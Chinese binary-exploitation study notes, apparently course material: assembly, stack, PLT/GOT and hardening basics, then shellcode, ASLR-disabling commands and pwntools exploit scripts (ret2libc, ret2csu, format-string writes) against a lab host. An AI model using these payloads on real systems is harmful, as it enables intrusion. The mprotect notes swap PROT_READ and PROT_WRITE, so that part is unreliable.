@@ -1,0 +1,934 @@
+		！！！汇编基础  ！！！
+
+
+AT&T 风格 					Intel 语法风格
+
+寄存器前加%符号 					寄存器前无符号表示
+立即数前加$符号 					立即数前无符号表示
+16 进制数使用 0x 前缀 				16 进制数使用 h 后缀
+源操作数在前, 目标操作数在后 			目标操作数在前，源操作数在后
+间接寻址使用()表示 				间接寻址使用[]表示
+操作位数为指令+l、w、b（如 0x1l） 			操作位数为指令+dword ptr 等（如 QWORDPTR[RAX]）
+间接寻址格式%sreg:disp(%base,index,scale)		间接寻址格式:sreg:[basereg+jndex*scale+disp]
+
+
+
+
+
+	x86
+
+8 个 32 位通用寄存器 EAX，EBX，ECX，EDX，ESI，EDI，EBP，ESP
+
+寄存器 eax 保存系统调用号，即 0xb；
+寄存器 ebx 保存第一个参数，即应该指向字符串“/bin/sh”的地址；
+寄存器 ecx 保存第二个参数，即 0；
+寄存器 edx 保存第三个参数，即 0。
+
+
+
+	x86_64
+
+16个通用寄存器:
+RAX, EAX, AX, AH, AL;
+RBX, EBX, BX, BH, BL;
+RCX, ECX, CX, CH, CL;
+RDX, EDX, DX, DH, DL;
+RSI, ESI, SI;
+RDI, EDI, DI;
+RBP, EBP;
+RSP, ESP;
+
+R8、R9、R10、R11、R12、Rl3、R14、R15;
+
+
+
+	GCC 中对这些寄存器的调用规则如下：
+
+RAX 作为函数返回值使用；
+RSP 作为栈指针寄存器，指向栈顶；
+RDI，RSI，RDX，RCX，R8，R9 用作函数参数，依次对应第 1 参数，第 2 参数... 
+RBX，RBP，R12，R13，R14，R15 用作数据存储，遵循调用者保护规则，简单说就是被调用者随便用，因为调用者在调用子函数之前要备份它们，以防它们被修改；
+R10，R11 用作数据存储，遵循被调用者保护规则，简单说就是被调用者使用之前要先保存原值。
+
+
+
+
+
+	调用函数 H(a, b, c, d, e, f, g, h)时，参数按照如下方式传递：
+
+a->rdi, b->rsi, c->rdx, d->rcx, e->r8, f->r9
+push h
+push g
+call H
+
+CALL 指令执行时，下一条指令的地址 0x00008025 将被压入栈中，被调用函数 H 的地址 0x00008A00 则被加载至 EIP 寄存器
+
+RET 指令时，将分为两个过程。第一步，ESP 指向的数据将被弹出至 EIP 寄存器;第二步，ESP 的数值增加，将指向栈中的上—个位置（ESP指向栈顶）
+
+
+
+
+PUSHFD 指令把 32 位 EFLAGS 寄存器的内容压入栈中，POPFD 指令则把栈顶部数据弹出至 EFLAGS 寄存器中
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		！！！栈与栈帧  ！！！
+
+
+寄存器
+ebp	栈帧底部
+esp	栈帧顶部
+
+
+	例：
+void func(int m,int n){
+	int a = m;
+	int b = n;
+	int s = a + b;
+}
+main(){					<-- esp（运行func函数前）
+	int m = 1;
+	int n = 2;
+	func(m,n);
+	return 0;
+}					<-- ebp（运行func函数前）
+
+
+运行func()函数
+	push n;
+	push m;
+	call func;	(push eip ; )
+			__func : 		(帧栈初始化)
+				 push ebp ; 
+				 mov ebp,esp ; 
+				 sub esp,0x10 ;）
+	mov eax,DWORD PTR [ebp+0x08];		eax <-- m
+	mov DWORD PTR [ebp-0x0C],eax;		a <-- eax
+	mov eax,DWORD PTR [ebp+0x0C]; 		eax <- n
+	mov DWORD PTR [ebp-0x08],eax;		b <- eap
+
+func()函数返回					(帧栈清理)
+	mov esp,ebp ;
+	pop ebp ;			或	leave ;
+
+	retn ;		(pop eip)		retn ;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		！！！Linux虚拟内存空间 ！！！
+
+
+代码段（text） 		可执行代码、字符串字面值、只读变量
+只读数据段 rodata 	常量数据
+数据段（data） 		已初始化且初值非 0 的全局变量和静态局部变量
+BSS 段（bss） 		未初始化或初值为 0 的全局变量和静态局部变量
+堆（heap） 		动态分配的内存
+内存映射段（mmap）	用于映射可执行文件用到的动态链接库
+栈（stack） 局部变量、	函数参数、返回地址等
+命令行参数（argv） 	操作系统启动程序时，传递给程序的命令行参数
+环境变量（envp） 		操作系统设置的环境变量
+
+
+	1）保留区（reserved area）
+
+	2）代码段（text segment）		代码只读，不可更改
+
+	3）只读数据段（rodata）		指针变量，字符串，var
+		const 修饰的全局变量在常量区（只读数据段），但 const 修饰的局部变量只是为了防止修改，没有放入常量区，仍然存入堆栈段；
+
+	4）数据段（Data）			全局变量、静态局部变量
+
+	5）BSS 段			未初始化的变量
+
+	6）堆（heap）			指针变量指向的内存块
+
+	7）内存映射段（mmap）		映射可执行文件用到的动态链接库
+
+	8）栈（stack）			局部变量、函数参数、返回地址
+
+	9）命令行参数和环境变量区域
+
+	10）内核空间
+
+
+ldd		查看可执行文件运行时依赖的动态库
+
+objdump		反编译可执行文件
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		！！！PLT和GOT ！！！
+
+
+回写：		运行时修改，更专业的称谓应该是运行时重定位，与之相对应的还有链接时重定位（动态库）
+
+调用print函数，首先运行print_banner:
+			call print@plt
+
+PLT	过程链接表
+		printf@plt:
+			jmp *printf@got
+			push $0x10		(1)
+			jmp 80482e8		(跳转到 <__gmon_start__@plt-0x10> 再到 <__gmon_start__@got-0x10> 地址的函数运行寻找目标函数，运行后会将地址存在GOT表，下次调用目标函数可以直接使用)
+
+GOT	全局偏移表(记录目标函数的地址 或 （1）地址)
+		printf@got:
+			0xf7e835f0		（目标函数地址或 （1）地址）
+
+0xf7e835f0 <printf>:
+	...
+	ret
+	...
+
+
+PLT 属于代码段，在进程加载和运行过程都不会发生改变，PLT 指向 GOT 表的关系在链接完成后已完全确定，唯一能发生变化的是 GOT 表
+
+
+
+.plt 		代码段 		RE（可读，可执行）	实际就是通常所说的过程链接表（Procedure Linkage Table，PLT）
+.plt.got 	代码段 		RE（可读，可执行） 	用于存放__cxa_finalize 函数对应网安实验班内部资料的 PLT 条目
+.got 		数据段 		RW（可读，可写）		用于存放外部全局变量的地址也用于存放不需要延迟绑定的函数地址
+.got.plt 	数据段 		RW（可读，可写）		用于存放需要延迟绑定的外部函数的地址
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		！！！安全编译 ！！！
+
+
+checksec命令	(检测  gcc 编译出来的可执行程序开启了哪些安全选项)
+		(checksec --file=test)
+
+	安全编译选项
+
+NX	(No-eXecute  栈不可执行) 当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令
+	-z execstack：禁用 NX 保护；
+	-z noexecstack：开启 NX 保护；
+	默认情况下，开启 NX 保护
+
+Canary	( 栈保护机制，可以用来对抗栈溢出攻击 )  在程序初始运行时，生成一个随机数，每当有函数调用发生时，就将 canary 放在栈帧底部较近的位置，当函数调用结束之后，会检查这个 canary 的值有没有发生改变，若发生了	变化，则说明栈受到了攻击，那么就调用错误处理函数
+
+RELRO	( RELocation Read-Only) 将实现动态重定位的某些区域标记为只读
+	-z norelro：表示禁用 relro；
+	-z relro -z lazy：表示 Partial RELRO；
+	-z relro -z now：表示 Full RELRO。
+	默认是 Partial RELRO。
+
+PIE		(Position Independent Executables) 位置无关可执行文件,可执行文件加载到内存时其加载基址随机化
+		-no-pie：表示关闭 PIE；
+		-fpie -pie：表示开启 PIE。
+
+ASLR		(Address Space Layout Randomization) 地址空间布局随机化，libc、栈、堆的加载位置被随机化，但代码段不会，作用于编译过程
+		ASLR 有 0/1/2 三种级别，其中 0 表示 ASLR 未开启，1 表示随机化 stack、libraries，2 表示还会随机化 heap。
+		Linux 默认开启 ASLR（/proc/sys/kernel/randomize_va_space=2）
+		sysctl -w kernel.randomize_va_space=0 	;临时修改
+		echo 0 > /proc/sys/kernel/randomize_va_space 	;永久修改
+
+FORTIFY		非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如 memcpy、memset、stpcpy、strcpy、strncpy、strcat、
+		strncat、sprintf、snprintf、vsprintf、vsnprintf、gets 以及宽字符的变体
+
+		_FORTIFY_SOURCE=1，即较弱的检查，如果同时将编译器优化等级设置为 1(-O1)，以及出现上述情形，那么程序编译时就会进行检查，但不会改变程序功能。_FORTIFY_SOURCE=2，即较强的检查，gcc 生成了一些		附加代码，通过对数组大小的判断替换 strcpy、memcpy、memset 等函数名，达到防止缓冲区溢出的作用，但是这可能导致程序运行时崩溃。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		32位
+
+	反弹shellcode ：\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80
+
+
+	esp_add = struct.pack("<L", 0xbffff694)			# <L表示小端序的 unsigned long 类型
+
+
+	payload（将payload写入1.txt）
+
+import struct
+
+filename = "1.txt"
+
+junk = "A"*80
+ret_add = struct.pack("<L", 0x08048387)
+esp_add = struct.pack("<L", 0xbffff694)
+shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"
+
+payload = junk + ret_add + esp_add + "\x90"*20 + shellcode				# \x90 为汇编语言的 nop
+
+textfile = open(filename , 'w')
+textfile.write(payload)
+textfile.close()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		64位
+
+	echo 0 > /proc/sys/kernel/randomize_va_space			# 关闭系统 ASLR
+
+
+	下面shellcode执行的语句是execve("/bin/sh")
+\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
+
+
+	通过一个环境变量把 shellcode 存储在栈中
+export PWN=`python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`
+
+
+	使用 getenvaddr 工具获取环境变量在栈上的地址	（https://gist.github.com/superkojiman/6a6e44db390d6dfc329a，下载后编译：gcc -o getenvaddr getenvaddr.c）
+./getenvaddr PWN ./classic
+
+
+	gdb输出地址
+p system	&	find "/bin/sh"
+
+
+	Ropper工具查找目标语句	（https://github.com/sashs/ropper，更改目录名为Ropper，安装python模块：pip3 install filebytes capstone）
+python3 Ropper-master/Ropper.py --file classic --search "%rdi"
+
+命令ropper用法：	ropper
+		file ./文件		(加载文件)
+		search pop rdi
+		gadgets			(输出所有)
+
+
+	payload				# 将payload写入1.txt
+
+#!/usr/bin/env python
+from struct import *
+
+buf = ""
+buf += "A"*104 # padding
+buf += pack("<Q", 0x400693) 		# pop rdi; ret;
+buf += pack("<Q", 0x7ffff7b95009) 	# pointer to "/bin/sh" gets popped into rdi
+buf += pack("<Q", 0x7ffff7a502c0) 	# address of system()
+
+f = open("1.txt", "w")
+f.write(buf)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		远程pwn	（开启靶机程序：socat tcp-l:4444,reuseaddr,fork exec:./文件名）
+
+	payload
+
+# ret2text（64位）							# 直接使用可执行文件里的函数
+
+from pwn import *
+
+r = remote('192.168.184.100', 4444)
+
+elf = ELF('./ret2text') 			#以 ELF 文件格式读取 ret2text 文件
+sysaddr = elf.symbols['callsystem'] 		#获取 ELF 文件中 callsystem 函数的地址
+print('0x%x'%sysaddr)
+						# 栈中 buf 数组占 0x80 个字节，[rbp]占 8 个字节，后面才是 vulnerable_function 的返回地址
+payload = b'a'*0x80 + b'b'*8 + p64(sysaddr)
+
+r.recvuntil(b'\n')				# 当收到 '\n' 时才会继续往下执行
+r.sendline(payload)				# 发送payload
+r.interactive()					# 开启交互
+
+
+
+
+
+# ret2shellcode（64位）							# NX未开启，有足够空间写入shellcode
+									# read()存在栈溢出漏洞
+from pwn import *
+
+r = remote('192.168.184.100', 4444)
+
+	# 从输出字符串中截取 buf 的地址
+buf_addr = int(r.recvline()[14:-2], 16)
+print('%#x' % buf_addr)
+
+	# 生成一段标准 shellcode
+	# shellcraft.arm 是 ARM 架构，shellcraft.amd64 是 AMD64架构，shellcraft.i386 是 Intel 80386 架构，shellcraft.common 是通用架构。可以通过 context设置架构，然后生成 shellcode，而 	
+	# shellcraft.sh()则是生成执行 Linux 命令“/bin/sh”的 shellcode
+context(arch='amd64', os='linux')
+shellcode = asm(shellcraft.sh()) + b'\x00'	# shellcraft 是 pwntools 的一个模块，包含一些生成 shellcode 的函数
+
+	# 由于 buf 被填充为 shellcode，且 buf 地址已知，因此可以让程序跳到 buf 执行 shellcode
+	# 栈中 buf 和冗余字节的长度为 0x90，未写满的空间用 a 填充，[rbp]占 8 个字节，后面才是 vulnerable_function 的返回地址
+payload = shellcode.ljust(0x90, b'a') + b'b'*8 + p64(buf_addr)
+r.sendline(payload)
+r.interactive()
+
+
+
+
+
+# ret2plt（32位）								# 程序使用过system函数，且有 /bin/sh 字段，模拟函数调用
+
+from pwn import *
+
+r = remote('192.168.184.100', 4444)
+
+elf = ELF('./ret2plt')
+system_addr = elf.plt['system']
+bin_sh_addr = next(elf.search(b'/bin/sh'))
+print("system_addr:0x%x" % system_addr)
+print("bin_sh_addr:0x%x" % bin_sh_addr)
+
+	# 栈中 buf 的长度为 0x88，[ebp]占 4 个字节，后面才是 vulnerable_function 的返回地址，
+	# 将 vulnerable_function 的返回地址覆盖为 system 函数的入口地址，
+	# 当函数 vulnerable_function 返回时，
+	# 将进入库函数 system 执行。这里模拟调用库函数 system，
+	# 在调用 system 函数之前，首先要 system 函数的入参压入栈，
+	# 然后再将 system 函数的返回地址压入栈
+	# 这里，p32(0)就是伪造的 system 函数的返回地址
+payload = b'a'*(0x88+4) + p32(system_addr) + p32(0) + p32(bin_sh_addr)
+
+r.send(payload)
+r.interactive()
+
+
+
+
+
+# ret2libc(32位)								# 有libc文件，且 NX 未开启，泄露出一个函数的真实地址（有write或puts），根据 libc 计算基地址，得出 system 函数及字符串地址
+from pwn import *							# read()存在栈溢出漏洞
+
+r = remote('192.168.184.100','4444')
+
+elf = ELF('./ret2libc')
+func_vul_addr = elf.symbols['vulnerable_function']
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+print('func_vul_addr:%#x' % func_vul_addr)
+print('write_plt:%#x' % write_plt)
+print('write_got:%#x' % write_got)
+
+junk = b'a'*0x88 + b'b'*4;
+
+	#write函数的原型：write(int fd, const void *buf, size_t n)
+	#通过write函数输出write函数对应got表项的内容，即函数write在内存中的实际地址
+	#调用write后，令其返回到函数vul，目的是为了再次执行函数vul
+	#             ret_addr       write的返回地址       fd         buf            n
+payload1 = junk + p32(write_plt) + p32(func_vul_addr) + p32(1) + p32(write_got) + p32(4)
+r.recvuntil(b"Input:\n")
+r.sendline(payload1)
+
+write_addr = u32(r.recv(4))
+print('write_addr:%#x' % write_addr)
+
+	#找到函数在文件libc.so中的地址
+libc = ELF('./libc-2.31.so')
+libc_write = libc.symbols['write']
+libc_system = libc.symbols['system']
+	#找到字符串在文件libc.so中的地址
+libc_bin_sh = next(libc.search(b'/bin/sh'))
+
+	#计算偏移量：write函数被加载到内存中的地址-write函数在libc.so中的地址，
+	#这个偏移量就是libc.so被加载到内存中的真实起始地址
+	#通过该偏移量，可以定位其它库函数在内存中的地址
+libc_offset = write_addr - libc_write
+	#定位函数system在内存中的地址
+system_addr = libc_system + libc_offset
+	#定位字符串在内存中的地址
+bin_sh_addr = libc_bin_sh + libc_offset
+print('system_addr:%#x' % system_addr)
+print('bin_sh_addr:%#x' % bin_sh_addr)
+
+        #            ret_addr         伪造的返回地址      参数：'/bin/sh'
+payload2 = junk + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
+r.recvuntil(b"Input:\n")
+r.sendline(payload2)
+
+r.interactive()
+
+
+
+
+
+# dynelf（32位）								# 无 libc文件及不知道 libc版本，但任意函数地址可泄露（需要有 write 函数），直接泄露出 system 函数地址
+									# read()存在栈溢出漏洞
+from pwn import *
+
+r = remote('192.168.184.100',4444)
+
+elf = ELF('./dynelf')
+write_plt = elf.plt['write']
+vul_addr = elf.symbols['vulnerable_function']
+junk = b'a'*(0x88+4)
+
+	#定义 DynELF 模块所需的函数，该函数要能够实现任意地址读，并且能够反复触发
+def leak(address):
+	payload1 = junk + p32(write_plt) + p32(vul_addr) + p32(1) + p32(address) + p32(4)
+	r.sendline(payload1)
+	data = r.recv(4)
+	return data
+
+	#准备使用DynELF远程泄露库函数的真实加载地址
+memory = DynELF(leak, elf=elf)
+	#搜索远程libc中system函数的真实加载地址
+system_addr = memory.lookup('system', 'libc')
+
+	#搜索bss段起始地址
+bss_addr = elf.bss()
+	#查找read函数的plt地址
+read_plt = elf.plt['read']
+
+	#            ret_addr      read返回地址         参数1        参数2        参数3
+payload2 = junk + p32(read_plt) + p32(vul_addr) + p32(0) + p32(bss_addr) + p32(8)
+r.sendline(payload2)
+
+	#在bss段中写入'/bin/sh'，注意00截断
+r.send(b"/bin/sh\0")
+
+	#调用system('bin/sh')
+payload3 = junk + p32(system_addr) + p32(0) + p32(bss_addr)
+r.sendline(payload3)
+
+r.interactive()
+
+
+
+
+
+# ret2syscall（32位）								# 用ROPgadget工具寻找程序中的代码片段，利用程序中断 int 80 来执行系统调用号为  11 的 execve("/bin/sh",null,null)
+				# 寄存器 eax 保存系统调用号，即 0xb；寄存器 ebx 保存第一个参数，即应该指向字符串“/bin/sh”的地址；寄存器 ecx 保存第二个参数，即 0；寄存器 edx 保存第三个参数，即 0。
+from pwn import *
+
+r = remote('192.168.184.100', 4444)
+
+pop_eax = 0x080bb196
+pop_edx_ecx_ebx = 0x0806eb90
+int_0x80 = 0x08049421
+binbash = 0x080be408
+
+	# flat 的功能就是拼接字符串
+payload = flat([b'A' * 112, pop_edx_ecx_ebx, 0, 0, binbash, pop_eax, 0xb, int_0x80])
+r.sendline(payload)
+
+r.interactive() 
+
+
+	ROPgadget工具								# 可能会出错！！！
+apt install python3-ropgadget（安装）
+
+ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'eax'		# 查找 pop eax ; ret
+
+ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'ebx'		# 查找 pop ebx ; ... ; ret
+
+ROPgadget --binary ret2syscall --only 'int'				# 查找 int 80
+
+
+
+
+
+# ret2libc3（32位）							# 无libc文件，泄露出某个函数的真实地址，利用LibcSearcher 算出基地址得出 system 及字符串的真实地址，需要选择不同的libc版本尝试
+from pwn import *							#			(puts函数)
+from LibcSearcher import *
+
+p = remote('192.168.184.100', 4444)
+elf = ELF('./ret2libc3')
+
+puts_got_addr = elf.got['puts']
+puts_plt_addr = elf.plt['puts']
+main_plt_addr = elf.symbols['_start']
+
+print("puts_got_addr=" + hex(puts_got_addr))
+print("puts_plt_addr=" + hex(puts_plt_addr))
+print("main_plt_addr=" + hex(main_plt_addr))
+
+payload =  b'A'*112
+payload += p32(puts_plt_addr)
+payload += p32(main_plt_addr)
+payload += p32(puts_got_addr)
+
+p.recv()
+p.sendline(payload)
+puts_real_addr = u32(p.recv()[0:4])					# 64位时使用：puts=u64(r.recv(6).ljust(8,b'\x00'))
+print("puts_real_addr=" + hex(puts_real_addr))
+
+libc = LibcSearcher("puts", puts_real_addr)
+libc_base = puts_real_addr - libc.dump("puts")
+system_addr = libc_base + libc.dump("system")
+bin_sh_addr = libc_base + libc.dump("str_bin_sh")
+
+print("libc_base:" + hex(libc_base))
+print("system_addr:" + hex(system_addr))
+print("bin_sh_addr:" + hex(bin_sh_addr))
+
+payload =  b'A'*112
+payload += p32(system_addr) 	#覆盖返回地址为system函数
+payload += b"AAAA"  		#system的返回地址，随便输，因为之前调用了system('/bin/sh')
+payload += p32(bin_sh_addr)  	#system函数参数
+p.sendline(payload)
+
+p.interactive()
+
+
+
+
+
+# ret2csu1								# 有libc文件，通过csu 执行函数并送入参数泄露函数地址计算基地址，再写入system真实地址与/bin/sh字符串到bss 段
+from pwn import *
+
+#sh = process('./ret2csu1')
+sh = remote('192.168.184.100', 4444)
+elf = ELF('./ret2csu1')
+gadget1 = 0x00000000004011FE
+gadget2 = 0x00000000004011E8
+start_addr = 0x0000000000401050 
+puts_got = elf.got['puts']
+
+def csu(r12, r13, r14, r15, ret_addr):					# csu(调用函数，第一个参数，第二，第三，ret地址)		参数的顺序根据实际情况来定
+    	#构造栈溢出的padding
+    payload = b'a'*0x20 + b'b'*8 
+    	#gadgets1的地址
+    payload += p64(gadget1)
+    	#rsp=rsp+8相当于出栈一次
+    payload += b'a' * 8
+    	#rbx=0, rbp=1
+    payload += p64(0) + p64(1)
+    	#call调用的地址
+    payload += p64(r12)
+    	#三个参数的寄存器
+    payload += p64(r13) + p64(r14) + p64(r15)
+    	#gadgets2的地址
+    payload += p64(gadget2)
+    	#pop出的padding
+    payload += b'a' * 56
+    	#函数最后的返回地址
+    payload += p64(ret_addr)
+    sh.sendline(payload)
+    sleep(0.2)
+
+sh.recv()
+csu(puts_got, puts_got, puts_got, puts_got, start_addr)
+puts_real_addr = u64(sh.recv(6) + b'\x00\x00')
+
+libc_base_addr = puts_real_addr - 0x084420
+system_real_addr = libc_base_addr + 0x052290
+
+read_got = elf.got['read']
+bss_addr = 0x404038
+
+sh.recv()
+csu(read_got, 0, bss_addr, 16, start_addr)
+sh.sendline(p64(system_real_addr) + b'/bin/sh')
+
+sh.recv()
+csu(bss_addr, bss_addr+8, 0, 0, start_addr)
+
+sh.interactive()
+
+
+
+
+
+# ret2csu2								# 无libc文件，通过csu执行函数并送入参数泄露函数地址计算基地址，尝试不同的libc版本，再写入execve真实地址与/bin/sh字符串到bss段
+from pwn import *
+from LibcSearcher import LibcSearcher
+	#context.log_level = 'debug'
+
+#sh = process('./ret2csu2')
+sh = remote('192.168.184.100', 4444)
+elf = ELF('./ret2csu2')
+
+	#pop_rbx_rbp_r12_r13_r14_r15_ret
+first_csu = 0x4006A6
+#call [r12 + rbx*8]
+second_csu = 0x400690
+
+main_addr = elf.symbols['main']
+write_got = elf.got['write']
+
+	#万能gadgets
+def csu(r12, r13, r14, r15, ret_addr):					# csu(调用函数，第三个参数，第二，第一，ret地址)		参数的顺序根据实际情况来定
+    	#构造栈溢出的padding
+    payload = b'a'*0x80 + b'b'*8 
+    	#gadgets1的地址
+    payload += p64(first_csu) + b'a' * 8    
+    	#rbx=0, rbp=1
+    payload += p64(0) + p64(1)
+    	#call调用的地址
+    payload += p64(r12)
+    	#三个参数的寄存器
+    payload += p64(r13) + p64(r14) + p64(r15)
+    	#gadgets2的地址
+    payload += p64(second_csu)
+    	#pop出的padding
+    payload += b'a' * 56
+    	#函数最后的返回地址
+    payload += p64(ret_addr)
+    sh.sendline(payload)
+    sleep(0.2)
+
+sh.recvuntil(b'Input:\n')
+	#获得write函数的真实加载地址
+csu(write_got, 8, write_got, 1, main_addr)
+write_addr = u64(sh.recv(8))
+print("write_addr = " + hex(write_addr))
+
+libc = LibcSearcher('write', write_addr)
+	#libc基地址 = write地址 - write偏移
+libc_base = write_addr - libc.dump('write')
+	#计算可执行程序中未出现的函数execve的地址
+execve_addr = libc_base + libc.dump('execve')
+
+#######################################################
+
+read_got    = elf.got['read']
+bss_addr    = elf.bss()
+
+sh.recvuntil(b'Input:\n')
+	#向bss段写入execve地址与'/bin/sh'字符串
+csu(read_got, 16, bss_addr, 0, main_addr)
+sh.send(p64(execve_addr) + b'/bin/sh\x00')
+
+#######################################################
+
+sh.recvuntil(b'Input:\n')
+	#调用execve('/bin/sh\x00')
+csu(bss_addr, 0, 0, bss_addr+8, main_addr)
+
+sh.interactive()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+			漏洞
+
+
+		格式化字符串漏洞（printf，从右到左依次压栈，使用时取值需要把目标地址压入栈内）
+
+任意内容读取	（%s，输出该内存值对应的地址中的字符串）
+%a$s		（a为偏移量，从栈中读出第a个变量）
+
+任意内容修改	（%n）
+%a$n		（a为偏移量，把当前所在的字节位数值写入栈中的第a个变量）
+
+例：
+# printf偏移量为10，从右到左依次压栈，使用时取值
+# payload=b'A'*4+p32(0x804C044)+p32(0x804C045)+p32(0x804C046)+p32(0x804C047)      # AAAA为第10个参数，以此类推
+# payload+=b'%11$n%12$n%13$n%14$n'                                                # 修改 0x804C044 地址的值 ...
+# p.sendline(str(0x14141414))
+
+# payload=p32(0x804C044)+p32(0x804C045)+p32(0x804C046)+p32(0x804C047)            # 0x804C044为第10个参数，以此类推
+# payload+=b'%10$n%11$n%12$n%13$n'
+# p.sendline(str(0x10101010))
+
+# payload = b'%15$n%16$n%17$n%18$n' + p32(0x804C044) + p32(0x804C045) + p32(0x804C046) + p32(0x804C047)		# '%15$n%16$n%17$n%18$n' 占5个空间
+# p.sendline(str(0x0))
+
+
+
+
+
+		地址泄露
+	puts()				# 一个参数
+	write()
+
+
+
+
+
+
+		栈溢出漏洞
+	gets()
+	strcpy()
+	
+
+
+
+
+
+
+
+		'/x00'截断
+
+
+
+
+
+
+
+		mprotect破除NX
+
+int mprotect(const void *start, size_t len, int prot);
+	第一个参数填的是一个地址，是指需要进行操作的地址。
+	第二个参数是地址往后多大的长度。
+	第三个参数的是要赋予的权限。
+
+mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。
+prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：
+　　1）PROT_READ：表示内存段内的内容可写；
+　　2）PROT_WRITE：表示内存段内的内容可读；
+　　3）PROT_EXEC：表示内存段中的内容可执行；
+　　4）PROT_NONE：表示内存段中的内容根本没法访问。
+
+prot=7 是可读可写可执行，记住就行，类似于chmod中的7
+
+例：p32(mprotect_addr) +p32(pop3_ret)+ p32(bss_addr) + p32(0x1000) + p32(0x7)
+	ret		 返回地址	起始地址		大小		权限
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
